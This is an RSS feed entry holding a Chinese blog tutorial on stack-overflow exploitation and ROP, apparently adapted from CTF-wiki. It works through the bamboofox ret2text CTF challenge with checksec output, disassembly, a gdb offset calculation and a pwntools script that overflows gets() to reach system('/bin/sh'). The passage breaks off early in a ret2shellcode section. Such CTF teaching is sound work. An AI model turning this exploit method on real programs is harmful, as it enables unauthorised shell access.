<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://alazymechnaic.github.io</id>
    <title>alazymachine • Posts by &#34;pwn&#34; tag</title>
    <link href="https://alazymechnaic.github.io" />
    <updated>2023-04-26T03:17:43.000Z</updated>
    <category term="paper" />
    <category term="fuzz" />
    <category term="arm" />
    <category term="Linux" />
    <category term="C" />
    <category term="go" />
    <category term="Paper" />
    <category term="bypass" />
    <category term="clash" />
    <category term="Hook" />
    <category term="go, RE" />
    <category term="kernel pwn" />
    <category term="binary" />
    <category term="writing" />
    <category term="HEAP PWN CTF" />
    <category term="Android" />
    <category term="dataflow" />
    <category term="pwn" />
    <category term="java" />
    <category term="web" />
    <category term="exploit" />
    <category term="network" />
    <entry>
        <id>https://alazymechnaic.github.io/2023/04/26/zhan-yi-chu-lou-dong-li-yong/</id>
        <title>栈溢出漏洞利用</title>
        <link rel="alternate" href="https://alazymechnaic.github.io/2023/04/26/zhan-yi-chu-lou-dong-li-yong/"/>
        <content type="html">&lt;p&gt;随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在&lt;strong&gt;栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。&lt;/strong&gt;所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。&lt;/p&gt;
&lt;p&gt;之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序存在溢出，并且可以控制返回地址。&lt;/li&gt;
&lt;li&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。&lt;/p&gt;
&lt;h2 id=&#34;ret2text¶&#34;&gt;&lt;a href=&#34;#ret2text¶&#34; class=&#34;headerlink&#34; title=&#34;ret2text¶&#34;&gt;&lt;/a&gt;ret2text&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text&#34;&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶&#34;&gt;&lt;a href=&#34;#原理-¶&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_1&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。&lt;/p&gt;
&lt;p&gt;这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶&#34;&gt;&lt;a href=&#34;#例子-¶&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_2&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text&#34;&gt;ret2text&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先，查看一下程序的保护机制&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;➜&lt;/span&gt;  &lt;span class=&#34;hljs-string&#34;&gt;ret2text&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;checksec&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;ret2text&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Arch:&lt;/span&gt;     &lt;span class=&#34;hljs-string&#34;&gt;i386-32-little&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RELRO:&lt;/span&gt;    &lt;span class=&#34;hljs-string&#34;&gt;Partial&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RELRO&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Stack:&lt;/span&gt;    &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;found&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;NX:&lt;/span&gt;       &lt;span class=&#34;hljs-string&#34;&gt;NX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;enabled&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;PIE:&lt;/span&gt;      &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;(0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;hljs-comment&#34;&gt;// [sp+1Ch] [bp-64h]@1&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(_bss_start, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;There is something amazing here, do you know anything?&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;gets&lt;/span&gt;((&lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v4);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;Maybe I will tell you next time !&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs assembly&#34;&gt;.text:080485FD secure          proc near&lt;br&gt;.text:080485FD&lt;br&gt;.text:080485FD input           = dword ptr -10h&lt;br&gt;.text:080485FD secretcode      = dword ptr -0Ch&lt;br&gt;.text:080485FD&lt;br&gt;.text:080485FD                 push    ebp&lt;br&gt;.text:080485FE                 mov     ebp, esp&lt;br&gt;.text:08048600                 sub     esp, 28h&lt;br&gt;.text:08048603                 mov     dword ptr [esp], 0 ; timer&lt;br&gt;.text:0804860A                 call    _time&lt;br&gt;.text:0804860F                 mov     [esp], eax      ; seed&lt;br&gt;.text:08048612                 call    _srand&lt;br&gt;.text:08048617                 call    _rand&lt;br&gt;.text:0804861C                 mov     [ebp+secretcode], eax&lt;br&gt;.text:0804861F                 lea     eax, [ebp+input]&lt;br&gt;.text:08048622                 mov     [esp+4], eax&lt;br&gt;.text:08048626                 mov     dword ptr [esp], offset unk_8048760&lt;br&gt;.text:0804862D                 call    ___isoc99_scanf&lt;br&gt;.text:08048632                 mov     eax, [ebp+input]&lt;br&gt;.text:08048635                 cmp     eax, [ebp+secretcode]&lt;br&gt;.text:08048638                 jnz     short locret_8048646&lt;br&gt;.text:0804863A                 mov     dword ptr [esp], offset command ; &#34;/bin/sh&#34;&lt;br&gt;.text:08048641                 call    _system&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。&lt;/p&gt;
&lt;p&gt;下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs assembly&#34;&gt;.text:080486A7                 lea     eax, [esp+1Ch]&lt;br&gt;.text:080486AB                 mov     [esp], eax      ; s&lt;br&gt;.text:080486AE                 call    _gets&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下&lt;/p&gt;
&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;gef➤  b *&lt;span class=&#34;hljs-number&#34;&gt;0x080486AE&lt;/span&gt;&lt;br&gt;Breakpoint &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x80486ae&lt;/span&gt;: file ret2text&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;c, line &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;.&lt;br&gt;gef➤  r&lt;br&gt;There is something amazing here, &lt;span class=&#34;hljs-built_in&#34;&gt;do&lt;/span&gt; you know anything?&lt;br&gt;&lt;br&gt;Breakpoint &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x080486ae&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; main () &lt;span class=&#34;hljs-meta&#34;&gt;at&lt;/span&gt; ret2text&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;c:&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;      gets(buf)&lt;span class=&#34;hljs-comment&#34;&gt;;&lt;/span&gt;&lt;br&gt;───────────────────────────────────────────────────────────────────────[ registers ]────&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;eax&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xffffcd5c&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x08048329&lt;/span&gt;  →  &lt;span class=&#34;hljs-string&#34;&gt;&#34;__libc_start_main&#34;&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;ebx&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0x00000000&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;ecx&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;edx&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xf7faf870&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x00000000&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;esp&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xffffcd40&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0xffffcd5c&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x08048329&lt;/span&gt;  →  &lt;span class=&#34;hljs-string&#34;&gt;&#34;__libc_start_main&#34;&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;ebp&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xffffcdc8&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x00000000&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;esi&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xf7fae000&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x001b1db0&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;edi&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0xf7fae000&lt;/span&gt;  →  &lt;span class=&#34;hljs-number&#34;&gt;0x001b1db0&lt;/span&gt;&lt;br&gt;$&lt;span class=&#34;hljs-built_in&#34;&gt;eip&lt;/span&gt;   : &lt;span class=&#34;hljs-number&#34;&gt;0x080486ae&lt;/span&gt;  →  &amp;lt;main+&lt;span class=&#34;hljs-number&#34;&gt;102&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x8048460&lt;/span&gt; &amp;lt;gets@plt&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 &lt;code&gt;esp+0x1c&lt;/code&gt;，因此，我们可以推断&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;s 的地址为 0xffffcd5c&lt;/li&gt;
&lt;li&gt;s 相对于 ebp 的偏移为 0x6c&lt;/li&gt;
&lt;li&gt;s 相对于返回地址的偏移为 0x6c+4&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后的 payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight clean&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs clean&#34;&gt;##!/usr/bin/env python&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;&lt;br&gt;sh = process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2text&#39;&lt;/span&gt;)&lt;br&gt;target = &lt;span class=&#34;hljs-number&#34;&gt;0x804863a&lt;/span&gt;&lt;br&gt;sh.sendline(&lt;span class=&#34;hljs-string&#34;&gt;&#39;A&#39;&lt;/span&gt; * (&lt;span class=&#34;hljs-number&#34;&gt;0x6c&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) + p32(target))&lt;br&gt;sh.interactive()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;ret2shellcode¶&#34;&gt;&lt;a href=&#34;#ret2shellcode¶&#34; class=&#34;headerlink&#34; title=&#34;ret2shellcode¶&#34;&gt;&lt;/a&gt;ret2shellcode&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode&#34;&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-1&#34;&gt;&lt;a href=&#34;#原理-¶-1&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。&lt;strong&gt;一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-1&#34;&gt;&lt;a href=&#34;#例子-¶-1&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_4&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;这里我们以 bamboofox 中的 ret2shellcode 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&#34;&gt;ret2shellcode&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先检测程序开启的保护&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;➜&lt;/span&gt;  &lt;span class=&#34;hljs-string&#34;&gt;ret2shellcode&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;checksec&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;ret2shellcode&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Arch:&lt;/span&gt;     &lt;span class=&#34;hljs-string&#34;&gt;i386-32-little&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RELRO:&lt;/span&gt;    &lt;span class=&#34;hljs-string&#34;&gt;Partial&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RELRO&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Stack:&lt;/span&gt;    &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;found&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;NX:&lt;/span&gt;       &lt;span class=&#34;hljs-string&#34;&gt;NX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;disabled&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;PIE:&lt;/span&gt;      &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;(0x8048000)&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RWX:&lt;/span&gt;      &lt;span class=&#34;hljs-string&#34;&gt;Has&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RWX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;segments&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序&lt;/p&gt;
